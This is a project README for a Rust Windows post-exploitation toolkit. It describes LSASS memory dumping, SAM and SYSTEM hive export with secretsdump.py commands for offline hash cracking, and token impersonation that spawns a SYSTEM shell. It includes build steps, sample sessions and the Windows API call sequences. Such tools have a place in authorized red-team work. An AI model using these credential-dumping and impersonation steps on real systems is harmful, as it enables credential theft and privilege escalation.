<div align="center">
  
# Carboxylate - Windows Post-Exploitation Toolkit

<img src="https://github.com/user-attachments/assets/6cb2479d-2906-4694-a346-8a00f270b545" width="600"/>

</div>

---


## About

**Carboxylate** is a post-exploitation toolkit. Uses the `winapi` crate for direct Windows API access.

## Features

| Module | Command | Description |
|--------|---------|-------------|
| LSASS Dumper | `dumplsass` | Dumps LSASS process memory to disk for offline credential extraction. Enables `SeDebugPrivilege` and locates the LSASS PID automatically. |
| SAM Hash Dump | `dumpsam` | Exports the SAM and SYSTEM registry hives to disk. Hashes can be extracted offline with `secretsdump.py` or `samdump2`. |
| Token Impersonation | `impersonate` | Enumerates running processes with their owner (`DOMAIN\User`), lets you pick a PID, duplicates its token, and spawns `cmd.exe` under that identity. |

## Demo

You can lookup this simple demo here at [any.run](https://app.any.run/tasks/5ebd341a-38c7-4d8e-ac8a-13d88bfd5140)

## Quick Start

### Build on Windows

```powershell
# Make sure Rust is installed (https://rustup.rs)
cargo build --release
```

Binary will be at `target\release\carboxylate.exe`.

### Cross-compile from Linux

```bash
# Install the Windows target and MinGW linker
rustup target add x86_64-pc-windows-gnu
sudo apt install mingw-w64

# Build
cargo build --release --target x86_64-pc-windows-gnu
```

Binary will be at `target/x86_64-pc-windows-gnu/release/carboxylate.exe`.

### Run

**Interactive mode** — drop into the Carboxylate shell:

```
C:\> carboxylate.exe

   ____            _                      _       _
  / ___|__ _ _ __ | |__   _____  ___   _| | __ _| |_ ___
 | |   / _` | '_ \| '_ \ / _ \ \/ / | | | |/ _` | __/ _ \
 | |__| (_| | |  | | |_) | (_) >  <| |_| | | (_| | ||  __/
  \____\__,_|_|  |_|_.__/ \___/_/\_\\__, |_|\__,_|\__\___|
                                    |___/

  Windows Post-Exploitation Toolkit
  Type 'help' for available commands.

  Carboxylate > help

  Commands:
  -----------------------------------------
  dumplsass          Dump LSASS process memory
  dumpsam            Dump SAM & SYSTEM registry hives
  impersonate        Impersonate a process token
  help               Show this help menu
  exit               Exit Carboxylate

  Carboxylate > dumpsam
  [+] Running with elevated privileges
  [+] SeBackupPrivilege enabled
  [+] SAM hive saved to sam.save
  [+] SYSTEM hive saved to system.save
  [*] Extract hashes with:
      secretsdump.py -sam sam.save -system system.save LOCAL

  Carboxylate > dumplsass
  [+] Running with elevated privileges
  [+] SeDebugPrivilege enabled
  [+] Found lsass.exe (PID: 672)
  [+] LSASS dumped to lsass.dmp

  Carboxylate > impersonate
  [+] SeImpersonatePrivilege is enabled

  PID     Owner
  ---     -----
  4       NT AUTHORITY\SYSTEM
  672     NT AUTHORITY\SYSTEM
  1284    CORP\admin

  Enter PID to impersonate: 4
  [+] Spawned cmd.exe with PID: 5320
```

**One-shot mode:**

```
C:\> carboxylate.exe dumplsass
C:\> carboxylate.exe dumpsam
C:\> carboxylate.exe impersonate
```

## Project Structure

```
Carboxylate-Rust/
├── Cargo.toml                   Dependencies and metadata
├── build.rs                     Links dbghelp.lib and advapi32.lib
├── src/
│   ├── main.rs                  Entry point, interactive shell, command dispatch
│   ├── lsass_dumper.rs          Privilege checks, PID lookup, MiniDumpWriteDump
│   ├── sam_dumper.rs            SeBackup privilege, RegSaveKeyW for SAM & SYSTEM hives
│   └── token_impersonator.rs    Process enum, token duplication, CreateProcessWithTokenW
```

## Requirements

- Windows 10/11 (x64)
- Administrator privileges (for LSASS dump and SAM dump)
- `SeImpersonatePrivilege` (for token impersonation)
- Rust 1.70+ with `x86_64-pc-windows-msvc` or `x86_64-pc-windows-gnu` target

## How It Works

### LSASS Dumper (`lsass_dumper.rs`)

1. Checks if process is elevated via `TOKEN_ELEVATION`
2. Enables `SeDebugPrivilege` with `AdjustTokenPrivileges`
3. Walks processes via `CreateToolhelp32Snapshot` to find `lsass.exe`
4. Calls `MiniDumpWriteDump` to write memory to `lsass.dmp`
5. All handles wrapped in `SafeHandle` — automatically closed on drop

### SAM Hash Dump (`sam_dumper.rs`)

1. Checks if process is elevated via `TOKEN_ELEVATION`
2. Enables `SeBackupPrivilege` with `AdjustTokenPrivileges`
3. Opens `HKLM\SAM` with `RegOpenKeyExW` and saves to `sam.save` via `RegSaveKeyW`
4. Opens `HKLM\SYSTEM` and saves to `system.save` (contains boot key for decryption)
5. Output files can be parsed offline:

   ```
   secretsdump.py -sam sam.save -system system.save LOCAL
   samdump2 system.save sam.save
   ```

### Token Impersonation (`token_impersonator.rs`)

1. Verifies `SeImpersonatePrivilege` with `PrivilegeCheck`
2. Snapshots running processes, resolves each token owner via `LookupAccountSidW`
3. User picks a target PID
4. Duplicates the token with `DuplicateTokenEx`
5. Spawns `cmd.exe` via `CreateProcessWithTokenW` under the impersonated identity

## Disclaimer

> **This tool is for authorized security testing and educational purposes only.**
> Unauthorized access to computer systems is illegal. Only use Carboxylate on systems you own or have explicit written permission to test. The author is not responsible for any misuse.

---
